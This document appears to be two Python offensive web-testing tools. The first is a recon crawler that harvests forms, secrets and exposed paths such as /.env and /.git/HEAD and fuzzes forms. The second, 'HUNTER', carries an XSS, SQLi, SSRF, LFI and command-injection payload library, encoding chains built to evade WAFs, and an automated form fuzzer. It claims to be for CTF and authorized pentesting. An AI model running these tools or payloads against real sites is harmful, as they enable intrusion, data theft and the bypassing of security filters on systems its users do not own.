#!/usr/bin/env python3
"""
Advanced Web Recon & Form Analysis Tool
- Async-capable (threaded) crawling
- Login / cookie / token support
- JS-rendered page support (Selenium, optional)
- robots.txt + sitemap.xml discovery
- Hidden endpoints, comment extraction, JS file harvesting
- Form fuzzing (XSS/SQLi payload injection)
- CSRF / required field detection
- JSON + CSV + HTML report export
- Colorized CLI output
"""

import os, re, sys, json, csv, time, argparse, threading, queue
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib.parse import urljoin, urlparse, urldefrag, parse_qs
from urllib.robotparser import RobotFileParser
from bs4 import BeautifulSoup
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _D: 
        def __getattr__(self, _): return ""
    Fore = Style = _D()

# ──────────────────────────── CONFIG ────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
     "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"

XSS_PAYLOADS   = ['<script>alert(1)</script>', '"><svg/onload=alert(1)>', "'><img src=x onerror=alert(1)>"]
SQLI_PAYLOADS  = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND SLEEP(2)--", "' UNION SELECT NULL--"]
SSRF_PAYLOADS  = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"]
OPEN_REDIRECT  = ["https://evil.example.com", "//evil.example.com", "/\\evil.example.com"]

SKIP_EXT = re.compile(r'\.(jpg|jpeg|png|gif|svg|webp|ico|css|js|woff2?|ttf|eot|'
                      r'pdf|zip|rar|7z|mp4|mp3|avi|mov|exe|dmg|apk|jar)$', re.I)

INTERESTING_PATHS = [
    "/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env", "/admin", "/admin/",
    "/login", "/register", "/api", "/api/v1", "/swagger.json", "/openapi.json",
    "/graphql", "/.well-known/security.txt", "/backup.zip", "/config.php.bak",
    "/phpinfo.php", "/server-status", "/actuator/env",
]

# ──────────────────────────── CRAWLER ────────────────────────────
class ReconTool:
    def __init__(self, start_url, *, max_depth=3, max_pages=200,
                 threads=8, delay=0.2, timeout=10, respect_robots=True,
                 cookies=None, headers=None, use_selenium=False,
                 proxy=None, verify_ssl=True, output_dir="recon_out"):
        self.start_url   = start_url if start_url.endswith('/') else start_url
        self.domain      = urlparse(start_url).netloc
        self.scheme      = urlparse(start_url).scheme
        self.max_depth   = max_depth
        self.max_pages   = max_pages
        self.threads     = threads
        self.delay       = delay
        self.timeout     = timeout
        self.verify      = verify_ssl
        self.out         = output_dir
        self.use_selenium= use_selenium

        self.visited     = set()
        self.lock        = threading.Lock()
        self.results     = {
            "pages":    [],
            "forms":    [],
            "links":    set(),
            "js_files": set(),
            "comments": [],
            "hidden":   [],
            "fuzz":     [],
            "sitemap":  set(),
        }

        # session with retries
        self.session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3,
                      status_forcelist=[429, 500, 502, 503, 504])
        self.session.mount("http://",  HTTPAdapter(max_retries=retry))
        self.session.mount("https://", HTTPAdapter(max_retries=retry))
        self.session.headers.update({"User-Agent": UA})
        if headers: self.session.headers.update(headers)
        if cookies: self.session.cookies.update(cookies)
        if proxy: self.session.proxies = {"http": proxy, "https": proxy}
        self.session.verify = verify_ssl

        self.robots = None
        if respect_robots:
            self._load_robots()

        os.makedirs(self.out, exist_ok=True)

    # ── helpers ──
    def _load_robots(self):
        try:
            rp = RobotFileParser()
            rp.set_url(urljoin(self.start_url, "/robots.txt"))
            rp.read()
            self.robots = rp
            print(f"{Fore.CYAN}[*] robots.txt loaded")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] robots.txt unreachable ({e})")

    def _can_fetch(self, url):
        return not self.robots or self.robots.can_fetch(UA, url)

    def _norm(self, url):
        url, _ = urldefrag(url)
        return url.rstrip('/') if url.endswith('/') and len(url) > len(self.start_url) else url

    def _same_domain(self, url):
        return urlparse(url).netloc == self.domain

    def _get(self, url):
        try:
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            return r
        except Exception as e:
            print(f"{Fore.RED}[!] {type(e).__name__}: {url}")
            return None

    # ── extractors ──
    def _extract_links(self, soup, page):
        links = set()
        for a in soup.find_all('a', href=True):
            h = a['href'].strip()
            if not h or h.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                continue
            full = self._norm(urljoin(page, h))
            if self._same_domain(full) and not SKIP_EXT.search(full):
                links.add(full)
        return links

    def _extract_js(self, soup, page):
        js = set()
        for tag in soup.find_all(['script']):
            src = tag.get('src')
            if src:
                js.add(urljoin(page, src))
        for a in soup.find_all('a', href=True):
            if a['href'].endswith('.js'):
                js.add(urljoin(page, a['href']))
        return {j for j in js if self._same_domain(j)}

    def _extract_comments(self, html, page):
        found = []
        for c in re.findall(r'<!--(.*?)-->', html, re.S):
            c = c.strip()
            if len(c) > 5 and not c.startswith(('[if', 'google', 'Google')):
                found.append({"page": page, "comment": c[:300]})
        return found

    def _extract_hidden(self, html, page):
        hits = []
        patterns = {
            "API_KEY":   r'(?i)(api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})',
            "SECRET":    r'(?i)(secret|password|passwd|pwd)["\']?\s*[:=]\s*["\']([^"\']{6,})',
            "TOKEN":     r'(?i)(token|bearer)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{16,})',
            "AWS_KEY":   r'(AKIA[0-9A-Z]{16})',
            "PRIVATE_KEY": r'(-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----)',
            "GOOGLE_API": r'(AIza[0-9A-Za-z\-_]{35})',
            "SLACK_HOOK": r'(https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+)',
        }
        for name, pat in patterns.items():
            for m in re.finditer(pat, html):
                hits.append({"page": page, "type": name, "match": m.group(0)[:200]})
        return hits

    def _extract_forms(self, soup, page):
        out = []
        for idx, form in enumerate(soup.find_all('form'), 1):
            action = form.get('action') or ''
            method = (form.get('method') or 'get').upper()
            enctype = form.get('enctype') or 'application/x-www-form-urlencoded'
            full_action = urljoin(page, action) if action else page

            fields = []
            for tag in form.find_all(['input', 'textarea', 'select', 'button']):
                fields.append({
                    "tag": tag.name,
                    "name": tag.get('name'),
                    "type": tag.get('type') or tag.name,
                    "value": tag.get('value'),
                    "required": tag.has_attr('required'),
                    "placeholder": tag.get('placeholder'),
                })

            csrf_hint = any(
                f['name'] and ('csrf' in f['name'].lower() or 'token' in f['name'].lower())
                for f in fields
            )
            file_upload = enctype.startswith('multipart') or any(f['type']=='file' for f in fields)

            out.append({
                "page": page, "index": idx, "action": full_action,
                "method": method, "enctype": enctype,
                "csrf_hint": csrf_hint, "file_upload": file_upload,
                "fields": fields,
            })
        return out

    # ── worker ──
    def _process(self, url, depth):
        if url in self.visited: return []
        if not self._can_fetch(url): 
            print(f"{Fore.YELLOW}[-] robots blocked: {url}")
            return []
        r = self._get(url)
        if not r or r.status_code != 200: return []
        if 'text/html' not in r.headers.get('Content-Type',''): return []

        soup = BeautifulSoup(r.text, 'lxml')
        new_links = []

        # --- extraction
        forms = self._extract_forms(soup, url)
        links = self._extract_links(soup, url)
        js    = self._extract_js(soup, url)
        cmts  = self._extract_comments(r.text, url)
        hidd  = self._extract_hidden(r.text, url)

        with self.lock:
            self.results["pages"].append({"url": url, "status": r.status_code,
                                          "length": len(r.text), "depth": depth})
            self.results["forms"].extend(forms)
            self.results["links"].update(links)
            self.results["js_files"].update(js)
            self.results["comments"].extend(cmts)
            self.results["hidden"].extend(hidd)

            if forms:
                print(f"\n{Fore.GREEN}[+] {len(forms)} form(s) @ {url}")
                for f in forms:
                    tag = f"{Fore.MAGENTA}CSRF{Style.RESET_ALL} " if f['csrf_hint'] else ""
                    up  = f"{Fore.YELLOW}UPLOAD{Style.RESET_ALL} " if f['file_upload'] else ""
                    print(f"    → #{f['index']} {f['method']} {f['action']}  {tag}{up}")
                    for fld in f['fields']:
                        req = "*" if fld['required'] else " "
                        print(f"        {req} {fld['name']!r:<25} type={fld['type']}")
            if hidd:
                print(f"{Fore.RED}[!] {len(hidd)} potential secrets found in {url}")

            print(f"{Fore.CYAN}[.] ({len(self.results['pages'])}/{self.max_pages}) d={depth} {url}")

        if depth < self.max_depth:
            new_links = list(links)
        return new_links

    # ── main crawl ──
    def crawl(self):
        print(f"{Fore.CYAN}[*] Crawling {self.start_url}")
        print(f"{Fore.CYAN}[*] depth={self.max_depth} pages={self.max_pages} threads={self.threads}\n")
        queue_ = deque([(self.start_url, 0)])

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            while queue_ and len(self.visited) < self.max_pages:
                batch = []
                for _ in range(min(self.threads, len(queue_))):
                    if not queue_: break
                    u, d = queue_.popleft()
                    u = self._norm(u)
                    if u in self.visited: continue
                    self.visited.add(u)
                    batch.append((u, d))

                futures = {pool.submit(self._process, u, d): (u, d) for u, d in batch}
                for fut in as_completed(futures):
                    u, d = futures[fut]
                    try:
                        new = fut.result()
                        for link in new:
                            if link not in self.visited:
                                queue_.append((link, d + 1))
                    except Exception as e:
                        print(f"{Fore.RED}[!] worker {u}: {e}")
                time.sleep(self.delay)

        print(f"\n{Fore.GREEN}[✓] crawl done · pages={len(self.visited)} · forms={len(self.results['forms'])}")

    # ── extras ──
    def discover_sitemap(self):
        print(f"{Fore.CYAN}[*] Checking sitemap & interesting paths...")
        for p in ["/sitemap.xml", "/sitemap_index.xml"]:
            r = self._get(urljoin(self.start_url, p))
            if r and r.status_code == 200 and '<url' in r.text:
                for m in re.findall(r'<loc>(.*?)</loc>', r.text):
                    self.results["sitemap"].add(m.strip())
        print(f"    sitemap URLs: {len(self.results['sitemap'])}")

        def probe(path):
            url = urljoin(self.start_url, path)
            r = self._get(url)
            if r and r.status_code in (200, 301, 302, 401, 403):
                return (path, r.status_code, len(r.text))
            return None

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            for res in ex.map(probe, INTERESTING_PATHS):
                if res:
                    self.results["hidden"].append({
                        "page": self.start_url, "type": "ENDPOINT",
                        "match": f"{res[0]} [{res[1]}] {res[2]}B"
                    })
                    color = Fore.RED if res[1] == 200 else Fore.YELLOW
                    print(f"    {color}{res[0]}  → {res[1]} ({res[2]}B)")

    def fuzz_forms(self):
        print(f"\n{Fore.CYAN}[*] Fuzzing forms (XSS/SQLi/Redirect)...")
        for form in self.results["forms"]:
            if form["method"] == "GET":
                # inject in query params
                base = form["action"]
                for payload in XSS_PAYLOADS[:2]:
                    params = {f['name']: payload for f in form["fields"] if f['name']}
                    try:
                        r = self.session.get(base, params=params, timeout=self.timeout)
                        reflected = payload in r.text
                        if reflected:
                            self.results["fuzz"].append({
                                "form": base, "type": "XSS-REFLECT",
                                "payload": payload, "status": r.status_code
                            })
                            print(f"    {Fore.RED}✗ XSS reflected: {base}")
                            break
                    except: pass
            elif form["method"] == "POST":
                data = {f['name']: (f['value'] or "test") for f in form["fields"] if f['name']}
                for payload in SQLI_PAYLOADS[:2]:
                    probe = {k: payload for k in data}
                    try:
                        r = self.session.post(form["action"], data=probe, timeout=self.timeout)
                        body = r.text.lower()
                        if any(s in body for s in ["sql syntax", "mysql_", "ora-", "syntax error",
                                                    "unclosed quotation", "sqlite"]):
                            self.results["fuzz"].append({
                                "form": form["action"], "type": "SQLI-ERROR",
                                "payload": payload, "status": r.status_code
                            })
                            print(f"    {Fore.RED}✗ Possible SQLi: {form['action']}")
                            break
                    except: pass

    # ── selenium (JS) — optional ──
    def crawl_with_selenium(self):
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.common.by import By
        except ImportError:
            print(f"{Fore.RED}[!] selenium not installed"); return

        print(f"{Fore.CYAN}[*] Selenium crawl (JS-rendered)...")
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(options=opts)
        try:
            driver.get(self.start_url)
            time.sleep(2)
            for el in driver.find_elements(By.TAG_NAME, "a"):
                try:
                    href = el.get_attribute("href")
                    if href and self._same_domain(href):
                        self.results["links"].add(self._norm(href))
                except: pass
            for form in driver.find_elements(By.TAG_NAME, "form"):
                self.results["forms"].append({
                    "page": self.start_url, "index": 0,
                    "action": form.get_attribute("action") or self.start_url,
                    "method": (form.get_attribute("method") or "GET").upper(),
                    "enctype": form.get_attribute("enctype") or "",
                    "csrf_hint": False, "file_upload": False,
                    "fields": [], "source": "selenium"
                })
            print(f"    + JS links: {len(self.results['links'])}")
        finally:
            driver.quit()

    # ── reports ──
    def save_reports(self):
        jsr = {k: (list(v) if isinstance(v, set) else v) for k, v in self.results.items()}
        with open(f"{self.out}/report.json", "w") as f:
            json.dump(jsr, f, indent=2, default=str)

        with open(f"{self.out}/forms.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["page","action","method","index","csrf","upload","fields"])
            for fm in self.results["forms"]:
                w.writerow([fm["page"], fm["action"], fm["method"], fm["index"],
                            fm["csrf_hint"], fm["file_upload"],
                            "|".join(x["name"] or "" for x in fm["fields"])])

        html = f"""<html><head><meta charset="utf-8">
        <title>Recon — {self.start_url}</title>
        <style>body{{font-family:monospace;background:#111;color:#0f0;padding:20px}}
        h1,h2{{color:#0ff}}table{{border-collapse:collapse;width:100%}}
        td,th{{border:1px solid #333;padding:4px}}th{{background:#222}}</style>
        </head><body>
        <h1>Recon: {self.start_url}</h1>
        <p>Pages: {len(self.results['pages'])} · Forms: {len(self.results['forms'])}
        · JS: {len(self.results['js_files'])} · Hidden: {len(self.results['hidden'])}</p>
        <h2>Forms</h2><table><tr><th>Page</th><th>Action</th><th>Method</th><th>Fields</th></tr>
        {''.join(f"<tr><td>{fm['page']}</td><td>{fm['action']}</td><td>{fm['method']}</td>"
                 f"<td>{', '.join(x['name'] or '' for x in fm['fields'])}</td></tr>"
                 for fm in self.results['forms'])}
        </table>
        <h2>Hidden / Secrets</h2><ul>
        {''.join(f"<li><b>{h['type']}</b>: {h['match']} — {h['page']}</li>" for h in self.results['hidden'])}
        </ul>
        <h2>Fuzz Findings</h2><ul>
        {''.join(f"<li>{f['type']}: {f['form']} ({f['payload']})</li>" for f in self.results['fuzz'])}
        </ul></body></html>"""
        with open(f"{self.out}/report.html", "w") as f:
            f.write(html)

        print(f"\n{Fore.GREEN}[✓] Reports saved → {self.out}/")


# ──────────────────────────── CLI ────────────────────────────
def main():
    p = argparse.ArgumentParser(description="Advanced Recon & Form Tool")
    p.add_argument("url", help="start URL")
    p.add_argument("-d", "--depth", type=int, default=3)
    p.add_argument("-p", "--pages", type=int, default=200)
    p.add_argument("-t", "--threads", type=int, default=8)
    p.add_argument("--delay", type=float, default=0.2)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--cookie", help="session cookie string, e.g. 'sid=abc; tok=xyz'")
    p.add_argument("--header", action="append", help="Custom header 'K: V' (repeatable)")
    p.add_argument("--proxy", help="http://127.0.0.1:8080")
    p.add_argument("--no-robots", action="store_true")
    p.add_argument("--no-verify", action="store_true", help="ignore SSL errors")
    p.add_argument("--selenium", action="store_true", help="enable JS crawl")
    p.add_argument("--fuzz", action="store_true", help="fuzz forms")
    p.add_argument("--discover", action="store_true", help="probe common paths + sitemap")
    p.add_argument("-o", "--out", default="recon_out")
    args = p.parse_args()

    cookies = {}
    if args.cookie:
        for kv in args.cookie.split(";"):
            if "=" in kv:
                k, v = kv.strip().split("=", 1)
                cookies[k] = v
    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    tool = ReconTool(
        args.url, max_depth=args.depth, max_pages=args.pages,
        threads=args.threads, delay=args.delay, timeout=args.timeout,
        respect_robots=not args.no_robots, cookies=cookies, headers=headers,
        use_selenium=args.selenium, proxy=args.proxy,
        verify_ssl=not args.no_verify, output_dir=args.out
    )

    tool.crawl()
    if args.discover: tool.discover_sitemap()
    if args.selenium: tool.crawl_with_selenium()
    if args.fuzz:     tool.fuzz_forms()
    tool.save_reports()


if __name__ == "__main__":
    main()


======================================================================

#!/usr/bin/env python3
"""
HUNTER — Web Recon + Auto Fuzzer + WAF Fingerprint + Encoded Chains
CTF / Lab / Authorized Pentest ONLY.
"""

import os, re, sys, json, csv, time, base64, random, argparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib.parse import urljoin, urlparse, urldefrag, quote, urlencode
from urllib.robotparser import RobotFileParser
from bs4 import BeautifulSoup
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _D:
        def __getattr__(self, _): return ""
    Fore = Style = _D()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
     "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"

SKIP_EXT = re.compile(r'\.(jpg|jpeg|png|gif|svg|webp|ico|css|js|woff2?|ttf|eot|'
                      r'pdf|zip|rar|7z|mp4|mp3|avi|mov|exe|dmg|apk)$', re.I)

# ═══════════════════════════════════════════════════════════════
#                     PAYLOAD LIBRARY
# ═══════════════════════════════════════════════════════════════

PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<details open ontoggle=alert(1)>",
    ],
    "SQLI": [
        "'",
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(2)--",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
    ],
    "SSRF": [
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080",
        "file:///etc/passwd",
    ],
    "LFI": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd%00",
    ],
    "CMDI": [
        "; id",
        "| whoami",
        "&& ls -la",
        "`id`",
        "$(whoami)",
    ],
    "REDIRECT": [
        "//evil.com",
        "https://evil.com",
        "///evil.com",
    ],
}

# ═══════════════════════════════════════════════════════════════
#                    ENCODING CHAINS
# ═══════════════════════════════════════════════════════════════

def enc_url(s):         return quote(s, safe='')
def enc_url2(s):        return quote(quote(s, safe=''), safe='')
def enc_b64(s):         return base64.b64encode(s.encode()).decode()
def enc_b64url(s):      return base64.urlsafe_b64encode(s.encode()).decode()
def enc_hex(s):         return '0x' + s.encode().hex()
def enc_html(s):        return ''.join(f'&#x{ord(c):x};' for c in s)
def enc_unicode(s):     return ''.join(f'\\u{ord(c):04x}' for c in s)
def enc_jshex(s):       return ''.join(f'\\x{ord(c):02x}' for c in s)
def enc_case(s):        return ''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(s))
def enc_rand(s):        return ''.join(c.upper() if random.random()>.5 else c.lower() for c in s)
def enc_rev(s):         return s[::-1]

def chain_encoders(s, chain):
    """chain = list of encoder fns"""
    for fn in chain:
        s = fn(s)
    return s

# Pre-defined chains — increasingly aggressive
ENCODE_CHAINS = [
    ("plain",           []),
    ("url",             [enc_url]),
    ("url-x2",          [enc_url, enc_url]),
    ("url-x3",          [enc_url, enc_url, enc_url]),
    ("b64",             [enc_b64]),
    ("b64→url",         [enc_b64, enc_url]),
    ("url→b64",         [enc_url, enc_b64]),
    ("hex",             [enc_hex]),
    ("hex→url",         [enc_hex, enc_url]),
    ("html",            [enc_html]),
    ("html→url",        [enc_html, enc_url]),
    ("unicode",         [enc_unicode]),
    ("jshex",           [enc_jshex]),
    ("case-swap",       [enc_case]),
    ("random-case",     [enc_rand]),
    ("reverse",         [enc_rev]),
    ("b64url",          [enc_b64url]),
    ("uni→url→b64",     [enc_unicode, enc_url, enc_b64]),
]

def build_payload_variants(payload):
    """Return dict {chain_name: encoded_payload}"""
    out = {}
    for name, chain in ENCODE_CHAINS:
        try:
            out[name] = chain_encoders(payload, chain) if chain else payload
        except Exception:
            pass
    return out

# ═══════════════════════════════════════════════════════════════
#                    WAF FINGERPRINTS
# ═══════════════════════════════════════════════════════════════

WAF_SIGNATURES = {
    "Cloudflare":       ["cloudflare", "__cfduid", "cf-ray", "cf-cache-status"],
    "AWS WAF":          ["awselb", "aws-waf", "x-amzn-requestid"],
    "Akamai":           ["akamai", "akamaighost", "x-akamai"],
    "Imperva/Incapsula":["incap_ses", "visid_incap", "x-iinfo", "imperva"],
    "F5 BIG-IP":        ["bigip", "x-wa-info", "ts="],
    "ModSecurity":      ["mod_security", "modsecurity", "noyb"],
    "Sucuri":           ["sucuri", "x-sucuri-id", "cloudproxy"],
    "Barracuda":        ["barra", "barracuda"],
    "Wordfence":        ["wordfence"],
    "Fortinet":         ["fortiweb", "fortigate"],
    "Azure WAF":        ["azure", "x-azure"],
    "Google Cloud Armor":["google", "x-cloud-trace"],
    "Fastly":           ["fastly", "x-fastly"],
}

WAF_BLOCK_CODES = {403, 406, 429, 503, 501}
WAF_BLOCK_KEYWORDS = [
    "blocked", "forbidden", "security", "waf", "not acceptable",
    "access denied", "suspicious", "malicious", "protection",
]

class WAFDetector:
    def __init__(self, session):
        self.session = session

    def detect(self, url):
        """Return (waf_name, evidence) or (None, None)"""
        # 1. Passive — look at headers on a normal request
        try:
            r = self.session.get(url, timeout=8)
        except Exception:
            return None, None

        headers_blob = str(r.headers).lower() + " " + r.text[:3000].lower()
        for name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_blob:
                    return name, f"signature '{sig}' in response"

        # 2. Active — send a deliberately malicious payload
        probe = "' OR '1'='1 <script>alert(1)</script>"
        try:
            r2 = self.session.get(url + ("&" if "?" in url else "?") + "x=" + quote(probe),
                                  timeout=8)
            if r2.status_code in WAF_BLOCK_CODES:
                body = r2.text.lower()
                for kw in WAF_BLOCK_KEYWORDS:
                    if kw in body:
                        return "Unknown WAF", f"blocked probe ({r2.status_code}, '{kw}')"
                return "Unknown WAF", f"blocked probe ({r2.status_code})"
        except Exception:
            pass

        return None, None

# ═══════════════════════════════════════════════════════════════
#                    CRAWLER
# ═══════════════════════════════════════════════════════════════

class Hunter:
    def __init__(self, start_url, *, max_depth=3, max_pages=100, threads=6,
                 delay=0.3, timeout=10, respect_robots=True,
                 cookies=None, headers=None, output_dir="hunter_out"):
        self.start_url = start_url
        self.domain    = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.threads   = threads
        self.delay     = delay
        self.timeout   = timeout
        self.out       = output_dir
        os.makedirs(self.out, exist_ok=True)

        self.visited = set()
        self.queue   = deque([(start_url, 0)])
        self.results = {
            "pages":   [],
            "forms":   [],
            "waf":     {"name": None, "evidence": None},
            "fuzz":    [],
            "bypass":  [],
            "links":   set(),
            "secrets": [],
        }

        self.session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3,
                      status_forcelist=[429,500,502,503,504])
        self.session.mount("http://",  HTTPAdapter(max_retries=retry))
        self.session.mount("https://", HTTPAdapter(max_retries=retry))
        self.session.headers.update({"User-Agent": UA})
        if headers: self.session.headers.update(headers)
        if cookies: self.session.cookies.update(cookies)

        self.robots = None
        if respect_robots:
            self._load_robots()

    def _load_robots(self):
        try:
            rp = RobotFileParser()
            rp.set_url(urljoin(self.start_url, "/robots.txt"))
            rp.read()
            self.robots = rp
        except Exception:
            pass

    def _can_fetch(self, u):
        return not self.robots or self.robots.can_fetch(UA, u)

    def _norm(self, u):
        u, _ = urldefrag(u)
        return u

    def _same_domain(self, u):
        return urlparse(u).netloc == self.domain

    # ── extraction ──
    def _forms(self, soup, page):
        out = []
        for i, f in enumerate(soup.find_all('form'), 1):
            action = urljoin(page, f.get('action') or page)
            method = (f.get('method') or 'GET').upper()
            fields = []
            for tag in f.find_all(['input','textarea','select','button']):
                fields.append({
                    "name": tag.get('name'),
                    "type": tag.get('type') or tag.name,
                    "value": tag.get('value'),
                })
            csrf = any(x['name'] and ('csrf' in x['name'].lower() or
                                       'token' in x['name'].lower()) for x in fields)
            out.append({
                "page": page, "index": i, "action": action,
                "method": method, "csrf": csrf, "fields": fields,
            })
        return out

    def _links(self, soup, page):
        links = set()
        for a in soup.find_all('a', href=True):
            h = a['href'].strip()
            if not h or h.startswith(('javascript:','mailto:','tel:','#')):
                continue
            full = self._norm(urljoin(page, h))
            if self._same_domain(full) and not SKIP_EXT.search(full):
                links.add(full)
        return links

    def _secrets(self, html, page):
        pat = {
            "API_KEY":  r'(?i)(api[_-]?key)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})',
            "AWS_KEY":  r'(AKIA[0-9A-Z]{16})',
            "TOKEN":    r'(?i)(token)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{16,})',
            "PRIV_KEY": r'(-----BEGIN [A-Z ]+ PRIVATE KEY-----)',
            "GOOGLE":   r'(AIza[0-9A-Za-z\-_]{35})',
        }
        hits = []
        for name, p in pat.items():
            for m in re.finditer(p, html):
                hits.append({"page": page, "type": name, "match": m.group(0)[:150]})
        return hits

    # ── crawl single ──
    def _fetch(self, url):
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except Exception as e:
            print(f"{Fore.RED}[!] {type(e).__name__}: {url}")
            return None

    def crawl(self):
        print(f"{Fore.CYAN}[*] Crawl start: {self.start_url}")

        while self.queue and len(self.visited) < self.max_pages:
            batch = []
            for _ in range(self.threads):
                if not self.queue: break
                u, d = self.queue.popleft()
                u = self._norm(u)
                if u in self.visited: continue
                if not self._can_fetch(u): continue
                self.visited.add(u)
                batch.append((u, d))

            def worker(item):
                url, depth = item
                r = self._fetch(url)
                if not r or r.status_code != 200: return None
                if 'text/html' not in r.headers.get('Content-Type',''): return None
                return url, depth, r.text

            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                for res in ex.map(worker, batch):
                    if not res: continue
                    url, depth, html = res
                    soup = BeautifulSoup(html, 'lxml')

                    forms = self._forms(soup, url)
                    secrets = self._secrets(html, url)
                    self.results["pages"].append({"url": url, "depth": depth})
                    self.results["forms"].extend(forms)
                    self.results["secrets"].extend(secrets)

                    if forms:
                        print(f"{Fore.GREEN}[+] {len(forms)} form(s) @ {url}")
                        for f in forms:
                            tag = " CSRF" if f["csrf"] else ""
                            print(f"    #{f['index']} {f['method']} {f['action']}{tag}")

                    if secrets:
                        print(f"{Fore.RED}[!] {len(secrets)} secret(s) in {url}")

                    print(f"{Fore.CYAN}[.] ({len(self.visited)}/{self.max_pages}) "
                          f"d={depth} {url}")

                    if depth < self.max_depth:
                        for link in self._links(soup, url):
                            if link not in self.visited:
                                self.queue.append((link, depth + 1))

            time.sleep(self.delay)

        print(f"{Fore.GREEN}[✓] Crawled {len(self.results['pages'])} pages, "
              f"{len(self.results['forms'])} forms")

    # ── WAF ──
    def fingerprint_waf(self):
        print(f"\n{Fore.MAGENTA}[*] WAF fingerprinting...")
        det = WAFDetector(self.session)
        name, evidence = det.detect(self.start_url)
        self.results["waf"]["name"] = name
        self.results["waf"]["evidence"] = evidence
        if name:
            print(f"{Fore.RED}[!] WAF detected: {name}  ({evidence})")
        else:
            print(f"{Fore.GREEN}[✓] No obvious WAF")

    # ── FUZZER ──
    def _check_xss(self, sent, response_text):
        # direct reflection
        if sent in response_text: return True
        # html-encoded form
        if sent.replace('<','&lt;').replace('>','&gt;') in response_text:
            return False  # it's been safely encoded
        # unencoded angle brackets + payload keyword
        if '<script>' in sent.lower() and '<script>' in response_text.lower():
            return True
        return False

    def _check_sqli(self, response_text):
        sigs = ["sql syntax", "mysql_", "you have an error in your sql",
                "ora-", "syntax error", "unclosed quotation",
                "quoted string not properly terminated", "sqlite",
                "pg_query", "warning: mysql"]
        low = response_text.lower()
        for s in sigs:
            if s in low: return s
        return None

    def _check_cmdi(self, response_text):
        sigs = ["uid=", "root:x:", "gid=", "volume in drive",
                "directory of", "uid=0(root)"]
        for s in sigs:
            if s in response_text: return s
        return None

    def _check_lfi(self, response_text):
        sigs = ["root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:"]
        for s in sigs:
            if s in response_text: return s
        return None

    def _analyze(self, sent, response):
        text = response.text
        findings = []
        if self._check_xss(sent, text):
            findings.append(("XSS", "reflected"))
        sq = self._check_sqli(text)
        if sq: findings.append(("SQLI", f"error: {sq}"))
        cm = self._check_cmdi(text)
        if cm: findings.append(("CMDI", f"evidence: {cm}"))
        lf = self._check_lfi(text)
        if lf: findings.append(("LFI", f"evidence: {lf}"))
        return findings

    def fuzz_form(self, form, use_bypass=False):
        """Fuzz a single form"""
        findings = []
        action = form["action"]
        method = form["method"]
        names = [f["name"] for f in form["fields"] if f["name"]]

        if not names:
            return findings

        for cat, payloads in PAYLOADS.items():
            for payload in payloads[:3]:  # limit per category
                # encode chains (only if bypass mode)
                variants = (build_payload_variants(payload)
                            if use_bypass else {"plain": payload})

                for chain_name, pval in variants.items():
                    data = {n: pval for n in names}
                    try:
                        if method == "POST":
                            r = self.session.post(action, data=data,
                                                  timeout=self.timeout)
                        else:
                            r = self.session.get(action,
                                                 params=data,
                                                 timeout=self.timeout)

                        # WAF block?
                        if r.status_code in WAF_BLOCK_CODES:
                            print(f"{Fore.YELLOW}    ⚠ blocked [{chain_name}] "
                                  f"{cat} @ {action}")
                            continue

                        hits = self._analyze(pval, r)
                        for h_type, evidence in hits:
                            findings.append({
                                "form": action, "method": method,
                                "category": h_type, "payload": pval,
                                "chain": chain_name, "evidence": evidence,
                                "status": r.status_code,
                            })
                            print(f"{Fore.RED}    ✗ {h_type} [{chain_name}] "
                                  f"@ {action}  ({evidence})")
                    except Exception as e:
                        pass
        return findings

